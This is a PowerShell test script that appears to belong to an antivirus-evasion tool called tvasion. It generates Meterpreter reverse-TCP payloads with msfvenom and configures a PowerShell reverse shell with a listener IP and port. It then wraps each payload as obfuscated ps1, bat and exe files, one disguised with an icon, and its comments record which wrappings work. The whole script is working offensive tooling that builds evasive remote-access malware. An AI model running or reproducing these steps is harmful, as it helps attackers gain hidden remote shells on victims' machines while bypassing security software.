#!/usr/bin/env pwsh

# <configuration>
$ip = "192.168.1.211";
$port = 4242;
$portMeterpreter = 4444;
# </configuration>

# get current script path
function getScriptDirectory {
    $scriptInvocation = (Get-Variable MyInvocation -Scope 1).Value;
    return Split-Path $scriptInvocation.MyCommand.Path;
}
$__rootPath = getScriptDirectory;
$__workPath = Get-Location;

# check if compiler is available
if ((Get-Command "mcs" -ErrorAction SilentlyContinue) -eq $null) { 
    write-output "tvasion: compiler "mcs" not available, required for this action";
    write-output "tvasion: try: apt-get install -y mono-mcs";
    exit 1;
}

# check if metasploit is available
$meterpreter = $TRUE;
if ((Get-Command "msfconsole" -ErrorAction SilentlyContinue) -eq $null) { 
    write-output "tvasion: "msfconsole" not available, will not execute meterpreter tests";
    $meterpreter = $FALSE;
} else {

    # check if msfconsole / framework process    
    $msfconsole = Get-Process msfconsole -ErrorAction SilentlyContinue;
    if (-not $?) { 
        write-output "tvasion: launch msfconsole in seperate terminal please and try again";
        exit 1;
    }  
    
    # use bash to create msfvenom, powershell do not support pipes for binary data
    write-output "tvasion: generate metasploit test payloads. This will take some time..." 
    $msfvenomExe = "msfvenom -p windows/x64/meterpreter_reverse_tcp --platform win -a x64 --format exe LHOST=$($ip) LPORT=$($portMeterpreter) > $($__rootPath)/out/Meterpreter_amd64.exe"
    bash -c "$($msfvenomExe)";
    $msfvenomPsh =  "msfvenom -p windows/x64/meterpreter_reverse_tcp --platform win -a x64 --format psh LHOST=$($ip) LPORT=$($portMeterpreter) > $($__rootPath)/out/Meterpreter_psh.ps1"
    bash -c "$($msfvenomPsh)";

}

# copy powershell reverse shell in /.out/, replace host and port
$pwshReverse = Get-Content -raw  "$($__rootPath)/tests/ReverseShell.ps1";
$pwshReverse = $pwshReverse -replace 'TCPClient\("[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+", [0-9]+\);', "TCPClient(`"$($ip)`", $($port));"
$pwshReverse > "$($__rootPath)/out/ReverseShell.ps1"

##
## see below whats works, what not
##

write-output "output -t ps1:"
iex "$($__rootPath)/tvasion.ps1 -d -t ps1 $($__rootPath)/out/ReverseShell.ps1 -o $($__rootPath)/out/ps1ps1_shell" # works
#iex "$($__rootPath)/tvasion.ps1 -d -t ps1 $($__rootPath)/out/ReverseShellc#_amd64.exe -o $($__rootPath)/out/exeps1_shell" # doesn't work with all files, special binary required
if ($meterpreter) {
    iex "$($__rootPath)/tvasion.ps1 -d -t ps1 $($__rootPath)/out/Meterpreter_psh.ps1 -o $($__rootPath)/out/ps1ps1_meterpreterpsh" # works
    iex "$($__rootPath)/tvasion.ps1 -d -t ps1 $($__rootPath)/out/Meterpreter_amd64.exe -o $($__rootPath)/out/exeps1_meterpreter" # works
    #iex "$($__rootPath)/tvasion.ps1 -d -t ps1 $($__rootPath)/out/Meterpreter_x86.exe -o $($__rootPath)/out/exeps1_meterpreterx86" # untested
}

write-output "output -t bat:"
iex "$($__rootPath)/tvasion.ps1 -d -t bat $($__rootPath)/out/ReverseShell.ps1 -o $($__rootPath)/out/ps1bat_shell" # works
if ($meterpreter) {
    iex "$($__rootPath)/tvasion.ps1 -d -t bat $($__rootPath)/out/Meterpreter_amd64.exe -o $($__rootPath)/out/exebat_meterpreter" # works
    #iex "$($__rootPath)/tvasion.ps1 -d -t bat $($__rootPath)/out/Meterpreter_x86.exe-o $($__rootPath)/out/exebat_meterpreterx86" # untested
}

write-output "output -t exe:"
iex "$($__rootPath)/tvasion.ps1 -d -t exe $($__rootPath)/out/ReverseShell.ps1 -o $($__rootPath)/out/ps1exe_shell" # works
#iex "$($__rootPath)/tvasion.ps1 -d -t exe $($__rootPath)/out/ReverseShellc#_amd64.exe -o $($__rootPath)/out/exeexe_shell" # doesn't work with all files, special binary required
if ($meterpreter) {
    iex "$($__rootPath)/tvasion.ps1 -d -t exe $($__rootPath)/out/Meterpreter_psh.ps1 -o $($__rootPath)/out/ps1exe_meterpreterpsh" # works maybe: requires small payload size restriction of arguments length of process.startupinfo.arguments
    iex "$($__rootPath)/tvasion.ps1 -d -t exe $($__rootPath)/out/Meterpreter_amd64.exe -o $($__rootPath)/out/exeexe_meterpreter" # works
    iex "$($__rootPath)/tvasion.ps1 -d -t exe $($__rootPath)/out/Meterpreter_amd64.exe -o $($__rootPath)/out/exeexe_meterpreter -i $($__rootPath)/tests/ghost.ico" # works, test with icon
    #iex "$($__rootPath)/tvasion.ps1 -d -t exe $($__rootPath)/out/Meterpreter_x86.exe -o $($__rootPath)/out/exeexe_meterpreterx86" # untested
}
write-output "tvasion: tests finished! see results in ./out"; 

